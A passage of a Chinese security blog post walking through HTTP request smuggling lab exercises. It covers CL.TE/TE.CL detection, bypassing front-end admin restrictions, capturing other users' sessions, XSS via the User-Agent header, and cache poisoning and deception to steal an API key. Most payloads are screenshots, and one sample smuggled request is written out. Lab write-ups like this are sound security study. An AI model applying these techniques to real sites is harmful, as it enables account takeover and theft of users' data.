+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234316568.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二次再随便发新包,发现成功拼接</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234349456.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验3：混淆-TE-标头"><a href="#实验3：混淆-TE-标头" class="headerlink" title="实验3：混淆 TE 标头"></a>实验3：混淆 TE 标头</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031235144364.png" srcset="/img/loading.gif" lazyload></p>
+<p>先进行简单的构造,猜测是最后形成TE-CL,那就是让后端忽略TE而去执行CL</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101004935135.png" srcset="/img/loading.gif" lazyload></p>
+<p>再发个正常包,发现成功拼接,前端TE读取所有,后端CL截出了G0</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101005000583.png" srcset="/img/loading.gif" lazyload></p>
+<p>重复上个实验的步骤</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101005238054.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功拼接</p>
+<h3 id="实验4：通过差异响应确认-CL-TE-漏洞"><a href="#实验4：通过差异响应确认-CL-TE-漏洞" class="headerlink" title="实验4：通过差异响应确认 CL.TE 漏洞"></a>实验4：通过差异响应确认 CL.TE 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101160634855.png" srcset="/img/loading.gif" lazyload></p>
+<p>题目说了前端不支持TE，那就是支持CL</p>
+<p>先进进行CL.TE测试，假设前端CL提前截断，后端TE等待chunked，成功得到超时响应</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101161415860.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试构造使得后续触发404，这样我们构造的GET404就会在后端隔离开并等待拼接</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101162550555.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样下一个包就会解析成GET404，原来的包会被拼接到yjh表头，像这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">yjh</span><span class="hljs-punctuation">: </span>aPOST /search HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101162613376.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验5：通过差异响应确认-TE-CL-漏洞"><a href="#实验5：通过差异响应确认-TE-CL-漏洞" class="headerlink" title="实验5：通过差异响应确认 TE.CL 漏洞"></a>实验5：通过差异响应确认 TE.CL 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163110353.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里先巩固一下知识，黑盒测试一下</p>
+<p>先测试CL.TE，假设前端是识别CL，那构造</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163611710.png" srcset="/img/loading.gif" lazyload></p>
+<p>应该会导致超时，但实际上没有</p>
+<p>再测试TE.CL，前端按照TE送进去所有数据，后端CL满足不了15，要等后面的数据导致超时</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163801972.png" srcset="/img/loading.gif" lazyload></p>
+<p>确定漏洞后直接构造</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101164547199.png" srcset="/img/loading.gif" lazyload></p>
+<p>再发个正常包就成功拼接404请求</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101164609822.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验6：HTTP-请求走私绕过前端安全控制，CL-TE-漏洞"><a href="#实验6：HTTP-请求走私绕过前端安全控制，CL-TE-漏洞" class="headerlink" title="实验6：HTTP 请求走私绕过前端安全控制，CL.TE 漏洞"></a>实验6：HTTP 请求走私绕过前端安全控制，CL.TE 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101175744160.png" srcset="/img/loading.gif" lazyload></p>
+<p>按要求看到封锁了amdin<img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180008674.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接用扩展扫出CL.TE<img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180409387.png" srcset="/img/loading.gif" lazyload></p>
+<p>手动验证，构造CL。TE测试payload，成功得到超时相应</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180702937.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造并发魔改包</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181019756.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到回显，能访问了，但不是本地用户	</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181047181.png" srcset="/img/loading.gif" lazyload></p>
+<p>在正常包修改HOST为localhost失败，那就在魔改包加个Host标头，同时把正常包忽略掉</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181627340.png" srcset="/img/loading.gif" lazyload></p>
+<p>再发正常包就成功了</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181700454.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面用同样方式触发delete请求即可</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101182040950.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验7：-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞"><a href="#实验7：-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞" class="headerlink" title="实验7： HTTP 请求走私绕过前端安全控制，TE.CL 漏洞"></a>实验7： HTTP 请求走私绕过前端安全控制，TE.CL 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101182249480.png" srcset="/img/loading.gif" lazyload></p>
+<p>手动测试漏洞 （12&#x3D;11+1，等不到12所以会超时）</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101183159449.png" srcset="/img/loading.gif" lazyload></p>
+<p>初步构造成功（11&#x3D;10+1）</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101184008244.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面和上个实验步骤一样 最终payload</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101184300767.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验8：利用-HTTP-请求走私来揭示前端请求重写"><a href="#实验8：利用-HTTP-请求走私来揭示前端请求重写" class="headerlink" title="实验8：利用 HTTP 请求走私来揭示前端请求重写"></a>实验8：利用 HTTP 请求走私来揭示前端请求重写</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101190311808.png" srcset="/img/loading.gif" lazyload></p>
+<p>先构造简单的CL.TE绕过前端WAF</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101191455019.png" srcset="/img/loading.gif" lazyload></p>
+<p>回显，要求ip为本地回环</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101191511066.png" srcset="/img/loading.gif" lazyload></p>
+<p>按题目提示，尝试把隐藏标头测试出来，这里我利用首页的搜索blog功能，因为它能反射回显</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192356986.png" srcset="/img/loading.gif" lazyload></p>
+<p>调整内层CL的数值，调整反射的范围，当设置为50的时候差不多就看出来了</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192506618.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192456218.png" srcset="/img/loading.gif" lazyload></p>
+<p>加上这个隐藏头，再简单改一改CL发出去就可以了</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192702154.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时发送正常包就成功走私</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192743425.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验9：HTTP-请求走私技术捕获其他用户的请求"><a href="#实验9：HTTP-请求走私技术捕获其他用户的请求" class="headerlink" title="实验9：HTTP 请求走私技术捕获其他用户的请求"></a>实验9：HTTP 请求走私技术捕获其他用户的请求</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101210926816.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先明确这是个CL.TE</p>
+<p>有很多参数，要把comment放到最后用于拼接，这个参数最不容易报错，限制最小，也容易查看</p>
+<p>最后一直试到920得到有效信息session，1000时直接超时。说明太大了</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101214307891.png" srcset="/img/loading.gif" lazyload></p>
+<p>不断查看评论，等受害者接上我的魔改包</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101214313953.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验10：利HTTP-请求走私实现反射型-XSS-攻击"><a href="#实验10：利HTTP-请求走私实现反射型-XSS-攻击" class="headerlink" title="实验10：利HTTP 请求走私实现反射型 XSS 攻击"></a>实验10：利HTTP 请求走私实现反射型 XSS 攻击</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101220034769.png" srcset="/img/loading.gif" lazyload></p>
+<p>看题目确定这是CL.TE走私</p>
+<p>在发送评论的包里 发现，DOM自动编码了符号阻止了直接的XSS，但多了一个参数UA很可疑</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221121291.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101220452816.png" srcset="/img/loading.gif" lazyload></p>
+<p>但不是用添加评论的路由的参数赋值改的，而是GET访问页面的UA标头决定的</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221105739.png" srcset="/img/loading.gif" lazyload></p>
+<p>本地测试反射xss成功</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221227356.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面就是通过http请求走私，是受害者访问UA附带XSS</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101222043923.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验11：HTTP请求走私-Web缓存投毒"><a href="#实验11：HTTP请求走私-Web缓存投毒" class="headerlink" title="实验11：HTTP请求走私+Web缓存投毒"></a>实验11：HTTP请求走私+Web缓存投毒</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101224842932.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到了有缓存机制的文件tracking.js</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101225329695.png" srcset="/img/loading.gif" lazyload></p>
+<p>且在根目录有对这个文件的解析使用</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101225354747.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里很明显就是有可能投毒的部分，在普通的Cache投毒中，需要想方设法覆盖这个js文件写入缓存或者产生一个重定向漏洞</p>
+<p>这里，发布评论后会产生一个重定向</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101230213901.png" srcset="/img/loading.gif" lazyload></p>
+<p>不好利用，还有一个查看下一篇的功能，这里是绝对路径跳转</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101231122574.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造一个请求走私</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101234757098.png" srcset="/img/loading.gif" lazyload></p>
+<p>再发一个正常包，发现接上了我构造的重定向</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101234826909.png" srcset="/img/loading.gif" lazyload></p>
+<p>再试一次，有缓存的静态文件访问写入了重定向Cache</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235255723.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后再依据路径更改一下我的攻击者服务器路径</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235632350.png" srcset="/img/loading.gif" lazyload></p>
+<p>再走一遍流程：构造一个魔改包，为了让后面的Cache机制写入的缓存不是静态文件tracking.js而是重定向请求。然后配合魔改包访问tracking.js正常包写入重定向缓存，这时别人访问更目录自动触发tracking.js会读缓存重定向到我的攻击者服务器</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235620747.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实验12：HTTP请求走私-Web缓存欺骗"><a href="#实验12：HTTP请求走私-Web缓存欺骗" class="headerlink" title="实验12：HTTP请求走私+Web缓存欺骗"></a>实验12：HTTP请求走私+Web缓存欺骗</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002304135.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们的目的是窃取APIkey，这是在用户界面的</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002721863.png" srcset="/img/loading.gif" lazyload></p>
+<p>经过检索网站，找到有缓存的静态文件tracking.js</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002902474.png" srcset="/img/loading.gif" lazyload></p>
+<p>想法就是构造魔改包，拼接静态文件，让受害者原本写入静态文件缓存结果魔改到了api界面，写入了api的缓存，随后访问一下tracking.js就能读到API</p>
+<p>我简单构造了第一个魔改包，但发正常包一直重定向到login而不是受害者的信息页</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004009682.png" srcset="/img/loading.gif" lazyload><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004039369.png" srcset="/img/loading.gif" lazyload></p>
+<p>意识到可能是没带上cookie，那就要换一个写法了，<img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004159867.png" srcset="/img/loading.gif" lazyload></p>
+<p>用Header拼接而不是参数，这样能带上受害者的所有Header（cookie）   而不是像参数法，会因为内层CL而截断受害者的cookie</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/" class="category-chain-item">web安全专题</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTTP1请求走私</div>
+      <div>https://i4g5d.github.io/2025/10/31/HTTP1请求走私/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>i4G5d</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/30/CSRF/" title="SOP,CORS,CSRF混淆区分">
+                        <span class="hidden-mobile">SOP,CORS,CSRF混淆区分</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
